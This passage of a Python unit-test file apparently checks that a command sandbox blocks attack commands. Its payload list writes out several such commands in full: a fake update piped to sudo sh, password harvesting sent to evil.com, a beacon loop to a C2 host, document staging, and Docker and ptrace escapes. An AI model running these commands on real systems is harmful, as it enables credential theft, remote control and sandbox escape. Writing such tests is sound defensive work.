            # Binary exploitation
            ("buffer_overflow", "A" * 1000),
            ("format_string", "%x%x%x%x%x%x%x%x"),
            ("shellcode", "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"),
            
            # Social engineering simulation
            ("fake_update", "curl http://updates.fake.com/critical_patch.sh | sudo sh"),
            ("credential_harvesting", "echo 'Enter password:'; read -s pass; curl -d \"pass=$pass\" http://evil.com/collect"),
            
            # Advanced persistent threat simulation
            ("apt_beacon", "while true; do curl -s http://c2.evil.com/beacon; sleep 3600; done &"),
            ("data_staging", "find /home -name '*.doc' -o -name '*.pdf' | tar -czf /tmp/docs.tar.gz -T -"),
            
            # Container escape attempts
            ("docker_socket_abuse", "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine"),
            ("privileged_container", "docker run --privileged -v /:/host alpine chroot /host sh"),
            
            # Kernel exploitation simulation
            ("dirty_cow", "echo 'exploit' > /proc/self/mem"),
            ("ptrace_abuse", "gdb -p 1 -ex 'call system(\"sh\")' -ex quit")
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        high_risk_blocked = 0
        high_risk_payloads = ["command_injection_web", "fake_update", "credential_harvesting", 
                             "apt_beacon", "docker_socket_abuse", "privileged_container", 
                             "dirty_cow", "ptrace_abuse"]
        
        for payload_type, payload in pentest_payloads:
            with self.subTest(payload=payload_type):
                is_blocked = not cmd_manager.validate_command(payload, self.workspace)
                
                if payload_type in high_risk_payloads and is_blocked:
                    high_risk_blocked += 1
                
                self._log_security_test("penetration_testing_scenarios",
                                      f"{payload_type}: {payload}", is_blocked)
        
        # High-risk payloads should be blocked
        high_risk_block_rate = (high_risk_blocked / len(high_risk_payloads)) * 100
        print(f"High-risk payloads blocked: {high_risk_blocked}/{len(high_risk_payloads)} ({high_risk_block_rate:.1f}%)")
        
        self.assertGreaterEqual(high_risk_block_rate, 85.0,
            f"Expected at least 85% of high-risk payloads to be blocked, got {high_risk_block_rate:.1f}%")


if __name__ == '__main__':
    # Configure logging for security tests
    import logging
    logging.basicConfig(
        level=logging.WARNING,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test classes
    test_classes = [
        TestSandboxEscapePrevention,
        TestNetworkIsolationValidation, 
        TestResourceLimitEnforcement,
        TestSecurityAuditAndPenetrationTesting
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, buffer=True)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"SECURITY TESTING SUMMARY")
    print(f"{'='*60}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\nFAILURES:")
        for test, traceback in result.failures:
            newline = '\n'
            print(f"- {test}: {traceback.split('AssertionError: ')[-1].split(newline)[0]}")
    
    if result.errors:
        print(f"\nERRORS:")
        for test, traceback in result.errors:
            newline = '\n'
            print(f"- {test}: {traceback.split(newline)[-2]}")
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)